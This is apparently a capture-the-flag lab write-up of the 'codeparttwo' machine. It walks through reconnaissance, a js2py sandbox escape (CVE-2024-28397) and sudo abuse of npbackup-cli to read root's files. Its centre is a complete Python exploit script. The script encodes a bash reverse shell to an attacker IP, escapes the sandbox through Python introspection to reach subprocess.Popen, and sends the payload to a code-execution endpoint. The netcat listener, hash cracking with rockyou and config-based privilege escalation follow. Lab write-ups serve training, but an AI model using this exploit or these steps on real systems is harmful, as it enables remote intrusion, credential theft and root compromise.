## Enumeration
I start with the reconnaissance with `nmap`

```sh
mkdir nmap
nmap -sV -sC -oA codeparttwo 10.10.11.82
```

![](../attachments/Pasted%20image%2020251110213857.png)

I run `gobuster` to enumerate directories:

![](../attachments/Pasted%20image%2020251110220724.png)

but I didn't find anything useful.

Then I visited the site on port 8000:

![](../attachments/Pasted%20image%2020251110220821.png)

I press the `Download App` button and then I find the `app.py` and the `requirements.txt`. In the `requirements.txt` I found:

![](../attachments/Pasted%20image%2020251110220945.png)

and searching on the Internet to find some vulnerabilities for these versions I found that when I googled `js2py 0.74` I found the `CVE 2024-28397`. So I searched on Google to find how to exploit this vulnerability and eventually I found this GitHub page:

![](../attachments/Pasted%20image%2020251110221247.png)

So following the instructions we run `netcat` on one terminal:
```sh
nc -lnvp 4444
```

On another terminal we create a python file `exploit.py`
```python
#!/usr/bin/env python3

"""
CVE-2024-28397 - js2py Sandbox Escape Exploit
Exploits js2py <= 0.74 vulnerability to achieve remote code execution
Author: naclapor
Date: 2025
"""

import requests
import json
import base64
import sys
import argparse

def generate_payload(target_ip, target_port):
    """
    Generate the JavaScript payload that exploits CVE-2024-28397
    
    Args:
        target_ip (str): Attacker's IP address for reverse shell
        target_port (str): Port for reverse shell connection
    
    Returns:
        str: JavaScript exploit payload
    """
    # Create bash reverse shell command
    reverse_shell = f"(bash >& /dev/tcp/{target_ip}/{target_port} 0>&1) &"
    # Base64 encode the reverse shell to avoid special character issues
    encoded_shell = base64.b64encode(reverse_shell.encode()).decode()
    
    # JavaScript payload exploiting CVE-2024-28397
    # This payload uses Python object introspection to escape the js2py sandbox
    js_code = f'''
let cmd = "printf '{encoded_shell}'|base64 -d|bash";
// Access Python's object hierarchy through JavaScript
let a = Object.getOwnPropertyNames({{}}).__class__.__base__.__getattribute__;
let obj = a(a(a, "__class__"), "__base__");

// Function to find subprocess.Popen class in Python's object hierarchy
function findpopen(o) {{
    let result;
    // Iterate through all subclasses of the object
    for(let i in o.__subclasses__()) {{
        let item = o.__subclasses__()[i];
        // Look specifically for subprocess.Popen class
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {{
            return item;
        }}
        // Recursively search in subclasses
        if(item.__name__ != "type" && (result = findpopen(item))) {{
            return result;
        }}
    }}
}}

// Execute the command using subprocess.Popen
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
console.log(result);
result;
'''
    return js_code, reverse_shell, encoded_shell

def exploit_target(target_url, payload):
    """
    Send the exploit payload to the target
    
    Args:
        target_url (str): Target URL endpoint
        payload (str): JavaScript payload to execute
    
    Returns:
        tuple: (success, response_text)
    """
    # Prepare HTTP request
    request_payload = {"code": payload}
    headers = {"Content-Type": "application/json"}
    
    try:
        # Send POST request with the malicious JavaScript code
        response = requests.post(target_url, data=json.dumps(request_payload), headers=headers, timeout=10)
        return True, response.text
    except requests.exceptions.Timeout:
        # Timeout often indicates successful shell connection
        return True, "Connection timeout - shell may have been established"
    except Exception as e:
        return False, str(e)

def main():
    """Main exploit function"""
    
    parser = argparse.ArgumentParser(description='CVE-2024-28397 js2py Exploit')
    parser.add_argument('--target', required=True, help='Target URL (e.g., http://10.10.11.82:8000/run_code)')
    parser.add_argument('--lhost', required=True, help='Local IP address for reverse shell')
    parser.add_argument('--lport', default='4444', help='Local port for reverse shell (default: 4444)')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not args.target.startswith('http'):
        print("[!] Error: Target URL must start with http:// or https://")
        sys.exit(1)
    
    print("=" * 60)
    print("CVE-2024-28397 - js2py Sandbox Escape Exploit")
    print("Targets js2py <= 0.74")
    print("=" * 60)
    print()
    
    # Generate exploit payload
    print("[*] Generating exploit payload...")
    js_payload, shell_command, encoded_shell = generate_payload(args.lhost, args.lport)
    
    print(f"[+] Target URL: {args.target}")
    print(f"[+] Reverse shell: {shell_command}")
    print(f"[+] Base64 encoded: {encoded_shell}")
    print(f"[+] Listening address: {args.lhost}:{args.lport}")
    print()
    print("[!] Start your listener: nc -lnvp", args.lport)
    print()
    
    # Wait for user confirmation
    input("[*] Press Enter when your listener is ready...")
    
    # Execute exploit
    print("[*] Sending exploit payload...")
    success, response = exploit_target(args.target, js_payload)
    
    if success:
        print(f"[+] Payload sent successfully!")
        print(f"[+] Response: {response}")
        print("[+] Check your netcat listener for the reverse shell!")
    else:
        print(f"[!] Exploit failed: {response}")
        print("[!] Make sure the target is vulnerable to CVE-2024-28397")

if __name__ == "__main__":
    main()
```

and then we run the `exploit.py`:
```python
python3 exploit.py --target http://10.10.11.82:8000/run_code --lhost 10.10.14.125 --lport 4444
```

![](../attachments/Pasted%20image%2020251110222345.png)

and on the other terminal, where we ran the `netcat` we got a shell:

![](../attachments/Pasted%20image%2020251110222428.png)

Then we upgrade it to an interactive shell with:
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

We find the database and the password hashes of two users `marco` and `app`:

![](../attachments/Pasted%20image%2020251110222711.png)

Then we run `hashcat`:
```sh
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

![](../attachments/Pasted%20image%2020251110223114.png)

We find the password of the user `marco`. So we are able to ssh to the user `marco` and find the user flag!!!
```sh
ssh@10.10.11.82
```

![](../attachments/Pasted%20image%2020251110223433.png)


## Privilege Escalation
Firstly, we type `sudo -l` to find what we can run as `sudo`:

![](../attachments/Pasted%20image%2020251110223556.png)
so we can run `npbackup-cli` as root without supplying a password.

We can see it requires some config file, which is available at `/home/marco/npbackup.conf`

So after that I will copy the `npbackup.conf` to a random file that I will create e.g. `malicious.conf`
```sh
cp npbackup.conf malicious.conf
```

![](../attachments/Pasted%20image%2020251110225631.png)

then modified the `paths` parameter to `/root/` and then using this new config file i create a snapshot:

![](../attachments/Pasted%20image%2020251110232429.png)

At first I tried to restore the `root.txt` but the user `marco` didn't have the permissions to read from that directory:

![](../attachments/Pasted%20image%2020251110232641.png)

then I used that snapshot(snapshot-id) to dump the contents within the backup root directory

![](../attachments/Pasted%20image%2020251110232353.png)
